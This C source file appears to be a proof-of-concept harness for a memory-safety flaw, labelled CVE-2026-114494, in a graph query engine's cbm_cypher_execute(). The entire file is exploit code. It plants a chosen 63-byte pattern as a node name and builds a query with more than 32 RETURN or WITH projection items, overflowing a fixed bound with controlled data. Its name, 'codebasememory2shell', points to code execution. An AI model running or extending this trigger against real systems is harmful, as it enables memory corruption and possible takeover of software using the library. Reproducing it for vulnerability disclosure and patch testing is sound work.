/*
 * codebasememory2shell — direct-call harness for CVE-2026-114494.
 *
 * Calls the pinned, unmodified cbm_cypher_execute() with a store-backed graph
 * and an N-item RETURN / WITH projection.  N=32 is the in-bounds control;
 * N>32 drives the unbounded loop in execute_return_simple() (and siblings).
 */
#include "cypher/cypher.h"
#include "store/store.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* 63 chosen bytes: readable marker followed by a distinct pattern. */
static const char CHOSEN[] =
    "MISHE-OO" "0123456789ABCDEF" "GHIJKLMNOPQRSTUV" "WXYZabcdefghijkl" "mnopqrstuvwxyz";

int main(int argc, char **argv) {
    int n = argc > 1 ? atoi(argv[1]) : 48;
    const char *kind = argc > 2 ? argv[2] : "RETURN";
    if (n < 1 || n > 512) {
        fprintf(stderr, "usage: %s N [RETURN|WITH]\n", argv[0]);
        return 2;
    }

    cbm_store_t *s = cbm_store_open_memory();
    if (!s) {
        fprintf(stderr, "store open failed\n");
        return 2;
    }
    cbm_store_upsert_project(s, "test", "/tmp/test");

    cbm_node_t node = {.project = "test",
                       .label = "Function",
                       .name = CHOSEN,
                       .qualified_name = "test.HandleOrder",
                       .file_path = "handler.go",
                       .start_line = 10,
                       .end_line = 30};
    cbm_store_upsert_node(s, &node);

    char query[16384];
    size_t off = (size_t)snprintf(query, sizeof(query), "MATCH (f:Function) %s ", kind);
    for (int i = 0; i < n; i++) {
        off += (size_t)snprintf(query + off, sizeof(query) - off, "%sf.name%s", i ? ", " : "",
                                i == n - 1 && strcmp(kind, "WITH") == 0 ? " RETURN f.name" : "");
    }
    if (strcmp(kind, "WITH") != 0) {
        query[off] = '\0';
    }

    cbm_cypher_result_t r = {0};
    int rc = cbm_cypher_execute(s, query, "test", 0, &r);
    printf("KIND=%s ITEMS=%d RC=%d ROWS=%d COLS=%d QUERY_LEN=%zu ERR=%s\n", kind, n, rc,
           r.row_count, r.col_count, strlen(query), r.error ? r.error : "(none)");
    printf("CHOSEN_LEN=%zu CHOSEN=%s\n", strlen(CHOSEN), CHOSEN);
    fflush(stdout);
    cbm_cypher_result_free(&r);
    cbm_store_close(s);
    return 0;
}
